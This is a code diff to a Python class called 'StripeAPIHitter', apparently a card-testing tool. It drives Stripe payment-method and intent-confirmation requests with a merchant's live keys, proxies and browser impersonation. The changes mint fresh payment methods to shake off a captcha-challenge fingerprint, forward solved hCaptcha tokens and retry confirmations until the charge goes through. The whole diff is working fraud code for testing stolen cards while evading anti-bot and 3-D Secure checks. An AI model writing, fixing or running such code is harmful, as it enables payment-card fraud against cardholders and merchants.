@@ -1745,44 +1745,42 @@ class StripeAPIHitter:
                                             pass
                                     print(f"[DEBUG CAPTCHA] triggered=True rqdata={bool(_top_rqdata)} token={bool(_hcaptcha_token)}")
                                     try:
-                                        if is_pi or is_seti:
-                                            reconfirm_data = {
-                                                "payment_method": pm_id,
-                                                "expected_payment_method_type": "card",
-                                                "key": self.pk_live,
-                                                "client_secret": self.cs_live
-                                            }
-                                        else:
-                                            # Re-mint a fresh PM — the original pm_id was created during
-                                            # the captcha-challenged session context. Reusing it on the
-                                            # re-confirm causes Stripe to re-issue requires_action because
-                                            # the PM is still associated with the challenge fingerprint.
-                                            fresh_pm_data = pm_data.copy()
-                                            fresh_pm_headers = headers.copy()
-                                            fresh_pm_headers["Idempotency-Key"] = str(uuid.uuid4())
-                                            try:
-                                                fresh_pm_res = await loop.run_in_executor(None, lambda: _cffi_session.post(
-                                                    pm_url, headers=fresh_pm_headers, data=fresh_pm_data, timeout=30))
-                                                fresh_pm_json = fresh_pm_res.json()
-                                                if fresh_pm_json.get('id'):
-                                                    pm_id = fresh_pm_json['id']
-                                            except Exception:
-                                                pass  # keep existing pm_id as fallback
-                                            reconfirm_data = {
-                                                "payment_method": pm_id,
-                                                "expected_payment_method_type": "card",
-                                                "payment_method_options[card][request_three_d_secure]": "automatic",
-                                                "consent[terms_of_service]": "accepted",
-                                                "key": self.pk_live,
-                                            }
+                                        # Once initial confirm mints a PaymentIntent, reconfirm MUST target /v1/payment_intents/{pi}/confirm with client_secret
+                                        _is_setup = is_setup_intent or (isinstance(pi, str) and 'seti' in pi)
+                                        _intent_ep = "setup_intents" if _is_setup else "payment_intents"
+                                        _target_confirm_url = f"https://api.stripe.com/v1/{_intent_ep}/{pi}/confirm" if (pi and client_secret) else confirm_url
+
+                                        fresh_pm_data = pm_data.copy()
+                                        fresh_pm_headers = headers.copy()
+                                        fresh_pm_headers["Idempotency-Key"] = str(uuid.uuid4())
+                                        try:
+                                            fresh_pm_res = await loop.run_in_executor(None, lambda: _cffi_session.post(
+                                                pm_url, headers=fresh_pm_headers, data=fresh_pm_data, timeout=30))
+                                            fresh_pm_json = fresh_pm_res.json()
+                                            if fresh_pm_json.get('id'):
+                                                pm_id = fresh_pm_json['id']
+                                        except Exception:
+                                            pass  # keep existing pm_id as fallback
+
+                                        reconfirm_data = {
+                                            "payment_method": pm_id,
+                                            "expected_payment_method_type": "card",
+                                            "payment_method_options[card][request_three_d_secure]": "automatic",
+                                            "use_stripe_sdk": "false",
+                                            "key": self.pk_live,
+                                        }
+                                        if client_secret:
+                                            reconfirm_data["client_secret"] = client_secret
                                         if self.raw_amount is not None and self.raw_amount > 0:
                                             reconfirm_data["expected_amount"] = self.raw_amount
                                         import uuid as _uuid
                                         reconfirm_headers = headers.copy()
                                         reconfirm_headers["Idempotency-Key"] = str(_uuid.uuid4())
+                                        if _hcaptcha_token:
+                                            reconfirm_headers["hcaptcha-response"] = _hcaptcha_token
                                         await asyncio.sleep(1)
                                         reconfirm_res = await loop.run_in_executor(None, lambda: cffi_requests.post(
-                                            confirm_url, headers=reconfirm_headers, data=reconfirm_data,
+                                            _target_confirm_url, headers=reconfirm_headers, data=reconfirm_data,
                                             proxies=proxies, timeout=30, impersonate=profile["impersonate"]))
                                         reconfirm_json = reconfirm_res.json()
                                         rc_pi = reconfirm_json.get('payment_intent') or reconfirm_json.get('setup_intent') or reconfirm_json
@@ -1980,7 +1978,7 @@ class StripeAPIHitter:
                                         await asyncio.sleep(1.5)
                                     
                                     # Fallback Exemption Re-confirm if still requires_action
-                                    if status_2 in ['requires_action', 'requires_source_action'] and (is_pi or is_seti):
+                                    if status_2 in ['requires_action', 'requires_source_action'] and pi and client_secret:
                                         try:
                                             fallback_confirm_url = f"https://api.stripe.com/v1/{intent_endpoint}/{pi}/confirm"
                                             fallback_data = {
